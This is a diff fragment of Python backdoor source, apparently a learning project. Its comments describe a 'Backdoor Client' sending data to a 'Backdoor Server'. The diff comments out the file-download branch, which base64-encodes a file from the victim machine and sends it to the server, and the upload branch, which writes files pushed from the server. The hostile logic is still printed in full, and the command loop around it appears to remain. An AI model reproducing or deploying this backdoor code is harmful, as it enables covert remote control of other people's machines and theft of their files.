@@ -96,31 +96,34 @@ def shell():
             #     cd_error = f'[!!] Cannot cd to this PATH: {str(e)}'
             #     continue
             
+            
         # 'download' command
         # For Downloading files from Backdoor Client => Backdoor Server
         # filePath starts from 9th CHAR 'download '
         # read binary data from files       
             # Start reading from first 9 CHAR as fileName
             # Encode file with ascii before sending
-        elif command[:8].strip() == 'download':
-            file_path = command[9:].strip()
-            if os.path.exists(file_path):
-                #with open(command[9:].strip(), 'rb') as file:
-                with open(file_path, 'rb') as file:
-                    # type(file) = _io.BufferedReader
-                    file_read = file.read()
-                    # type(file_read) = byte
-                    file_b64encode = base64.b64encode(file_read)
-                    # type(file_b64encode) = byte
-                    reliable_send(file_b64encode)
+            
+        # elif command[:8].strip() == 'download':
+        #     file_path = command[9:].strip()
+        #     if os.path.exists(file_path):
+        #         #with open(command[9:].strip(), 'rb') as file:
+        #         with open(file_path, 'rb') as file:
+        #             # type(file) = _io.BufferedReader
+        #             file_read = file.read()
+        #             # type(file_read) = byte
+        #             file_b64encode = base64.b64encode(file_read)
+        #             # type(file_b64encode) = byte
+        #             reliable_send(file_b64encode)
         
-        # 'upload' command
-        elif command[:6].strip() == 'upload':
-            #with open(command[7:].strip(), 'wb') as fin:
-            with open(command[7:], 'wb') as fin:
-                result = reliable_recv()
-                result_b64decode = base64.b64decode(result)
-                fin.write(result_b64decode)
+        # # 'upload' command
+        # elif command[:6].strip() == 'upload':
+        #     #with open(command[7:].strip(), 'wb') as fin:
+        #     with open(command[7:], 'wb') as fin:
+        #         result = reliable_recv()
+        #         result_b64decode = base64.b64decode(result)
+        #         fin.write(result_b64decode)
+                
                         
         else:
             try:
